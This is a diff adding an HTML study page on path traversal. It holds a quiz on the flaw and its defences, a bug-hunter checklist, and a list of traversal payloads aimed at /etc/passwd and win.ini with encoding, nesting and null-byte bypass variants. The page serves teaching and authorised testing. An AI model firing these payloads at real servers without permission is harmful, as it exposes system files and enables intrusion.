@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Path Traversal — Quiz & Bug Hunter Kit</title>
+<style>
+  body{font-family:system-ui,sans-serif;background:#1e1e1e;color:#eee;max-width:700px;margin:30px auto;padding:0 15px}
+  h1{color:#f2a541}
+  .card{background:#2a2a2a;border-radius:10px;padding:18px;margin:14px 0}
+  button{background:#f2a541;color:#111;border:none;padding:10px 16px;border-radius:6px;cursor:pointer;font-weight:bold;margin:4px 4px 4px 0}
+  button:hover{opacity:.85}
+  .opt{display:block;width:100%;text-align:left;background:#3a3a3a;color:#eee;margin:6px 0;padding:10px;border-radius:6px;border:1px solid #555}
+  .opt.correct{background:#2e7d32}
+  .opt.wrong{background:#c62828}
+  code{background:#111;padding:2px 6px;border-radius:4px;color:#8bd450}
+  #score{font-size:18px;color:#f2a541}
+  ul{padding-left:20px}
+  .hidden{display:none}
+  .chk{display:flex;align-items:flex-start;gap:10px;background:#3a3a3a;margin:6px 0;padding:10px;border-radius:6px}
+  .chk input{margin-top:3px;width:18px;height:18px}
+  .chk label{flex:1;cursor:pointer}
+  .chk.done label{color:#8bd450;text-decoration:line-through}
+</style>
+</head>
+<body>
+
+<h1>Path Traversal Toolkit</h1>
+<button onclick="showQuiz()">Quiz</button>
+<button onclick="showChecklist()">Bug Hunter Checklist & Payloads</button>
+
+<!-- QUIZ VIEW -->
+<div id="quizView">
+  <div class="card">
+    <div id="score">Score: 0 / 0</div>
+  </div>
+  <div id="quizArea"></div>
+  <button id="nextBtn" onclick="nextQuestion()">Next Question</button>
+</div>
+
+<!-- CHECKLIST VIEW -->
+<div id="checklistView" class="hidden">
+  <div class="card">
+    <h2>Bug Hunter Checklist — Path Traversal</h2>
+    <div id="checklistItems"></div>
+    <button onclick="resetChecklist()">Reset Checklist</button>
+  </div>
+
+  <div class="card">
+    <h2>Payloads used in this conversation</h2>
+    <ul>
+      <li><code>../../../etc/passwd</code> — basic traversal, no defenses</li>
+      <li><code>/etc/passwd</code> — absolute path bypass</li>
+      <li><code>....//....//....//etc/passwd</code> — non-recursive filter bypass</li>
+      <li><code>%2e%2e%2f</code> — URL-encoded <code>../</code></li>
+      <li><code>%252e%252e%252f</code> — double URL-encoded <code>../</code></li>
+      <li><code>..%c0%af</code> / <code>..%ef%bc%8f</code> — non-standard encoding</li>
+      <li><code>/var/www/images/../../../etc/passwd</code> — base-folder-prefix bypass</li>
+      <li><code>../../../etc/passwd%00.png</code> — null byte extension bypass</li>
+      <li><code>..\..\..\windows\win.ini</code> — Windows traversal</li>
+    </ul>
+  </div>
+</div>
+
+<script>
+const questions = [
+ {q:"What does '../' mean in a file path?", a:["Go up one folder level","Stay in current folder","Go to root directly","Create a new folder"], correct:"Go up one folder level"},
+ {q:"What is the base flaw behind Path Traversal?", a:["Weak passwords","App trusts raw user input in file paths without validation","SQL query concatenation","Missing HTTPS"], correct:"App trusts raw user input in file paths without validation"},
+ {q:"Which payload bypasses a filter that only blocks '/etc/passwd' style '../' but not leading '/'?", a:["../../../etc/passwd","/etc/passwd","....//etc/passwd","%2e%2e%2f"], correct:"/etc/passwd"},
+ {q:"Why does '....//' bypass a non-recursive '../' filter?", a:["It uses Windows syntax","Removing inner '../' once leaves '../' behind","It's a valid folder name","It skips validation entirely"], correct:"Removing inner '../' once leaves '../' behind"},
+ {q:"What does canonicalizing a path mean?", a:["Making it lowercase","Fully resolving it to its true final absolute path","Encoding it in Base64","Deleting special characters"], correct:"Fully resolving it to its true final absolute path"},
+ {q:"Why is checking 'startsWith(BASE_DIRECTORY)' done AFTER canonicalization?", a:["It's faster that way","Because raw input can hide traversal that only resolves later","It's required by HTTPS","To reduce server load"], correct:"Because raw input can hide traversal that only resolves later"},
+ {q:"What's the best overall prevention strategy?", a:["Block '../' with regex","Avoid passing user input to filesystem APIs at all (use IDs/whitelist)","Use HTTPS","Rate limit requests"], correct:"Avoid passing user input to filesystem APIs at all (use IDs/whitelist)"},
+ {q:"On Linux, which file is the classic proof-of-concept target?", a:["/etc/passwd","/boot.ini","C:\\windows\\win.ini","/var/log/access.log"], correct:"/etc/passwd"},
+ {q:"What does a null byte (%00) historically do in vulnerable filesystem APIs?", a:["Encrypts the path","Terminates the string early, ignoring what follows","Adds a new folder","Redirects the request"], correct:"Terminates the string early, ignoring what follows"},
+ {q:"Which is the strongest input validation approach (Layer 1)?", a:["Blacklist bad characters","Whitelist of exact allowed values","Length limit only","Case-insensitive check"], correct:"Whitelist of exact allowed values"}
+];
+
+let idx = 0, score = 0, answered = false;
+let order = [];
+
+function shuffle(arr){
+  let a = arr.slice();
+  for(let i=a.length-1;i>0;i--){
+    const j = Math.floor(Math.random()*(i+1));
+    [a[i],a[j]]=[a[j],a[i]];
+  }
+  return a;
+}
+
+function loadQuestion(){
+  answered = false;
+  const item = questions[idx];
+  order = shuffle(item.a);
+  const area = document.getElementById('quizArea');
+  area.innerHTML = `<div class="card"><b>Q${idx+1}.</b> ${item.q}<div id="opts"></div></div>`;
+  const opts = document.getElementById('opts');
+  order.forEach(opt=>{
+    const btn = document.createElement('button');
+    btn.className = 'opt';
+    btn.textContent = opt;
+    btn.onclick = ()=>selectAnswer(opt, item.correct, btn);
+    opts.appendChild(btn);
+  });
+}
+
+function selectAnswer(chosen, correct, btn){
+  if(answered) return;
+  answered = true;
+  const allBtns = document.querySelectorAll('.opt');
+  allBtns.forEach(b=>{
+    if(b.textContent === correct) b.classList.add('correct');
+    else if(b === btn) b.classList.add('wrong');
+    b.disabled = true;
+  });
+  if(chosen === correct) score++;
+  document.getElementById('score').textContent = `Score: ${score} / ${idx+1}`;
+}
+
+function nextQuestion(){
+  if(!answered){ alert('Pick an answer first'); return; }
+  idx++;
+  if(idx >= questions.length){
+    document.getElementById('quizArea').innerHTML = `<div class="card"><h2>Quiz complete!</h2>Final score: ${score} / ${questions.length}</div>`;
+    document.getElementById('nextBtn').style.display='none';
+    return;
+  }
+  loadQuestion();
+}
+
+function showQuiz(){
+  document.getElementById('quizView').classList.remove('hidden');
+  document.getElementById('checklistView').classList.add('hidden');
+}
+function showChecklist(){
+  document.getElementById('quizView').classList.add('hidden');
+  document.getElementById('checklistView').classList.remove('hidden');
+}
+
+const checklist = [
+ "Find every feature that loads a file: images, PDFs, downloads, avatars, templates, exports, includes.",
+ "Inspect requests (Burp/DevTools) for params like filename, file, path, doc, page, template, image.",
+ "Test baseline: does changing the value change the returned file? Confirms it's read from disk.",
+ "Try plain traversal: ../../../etc/passwd",
+ "If blocked, try absolute path: /etc/passwd",
+ "If blocked, try nested/non-recursive bypass: ....//....//....//etc/passwd",
+ "If blocked, try URL-encoded / double-encoded traversal.",
+ "If base-folder check exists, prepend known base + traversal.",
+ "If extension check exists, try null byte: %00.png (mostly legacy systems).",
+ "Check response body (not just status code) for file contents / errors leaking paths.",
+ "Test Windows-style separators ..\\ if server looks Windows-based.",
+ "Report: vulnerable param, payload, response proof, impact (what file/data was exposed)."
+];
+
+let checkedState = {};
+
+function renderChecklist(){
+  const box = document.getElementById('checklistItems');
+  box.innerHTML = '';
+  checklist.forEach((text,i)=>{
+    const row = document.createElement('div');
+    row.className = 'chk' + (checkedState[i] ? ' done' : '');
+    row.innerHTML = `<input type="checkbox" id="c${i}" ${checkedState[i]?'checked':''}><label for="c${i}">${text}</label>`;
+    row.querySelector('input').onchange = (e)=>{
+      checkedState[i] = e.target.checked;
+      row.classList.toggle('done', e.target.checked);
+    };
+    box.appendChild(row);
+  });
+}
+
+function resetChecklist(){
+  checkedState = {};
+  renderChecklist();
+}
+
+renderChecklist();
+loadQuestion();
+</script>
+</body>
+</html>
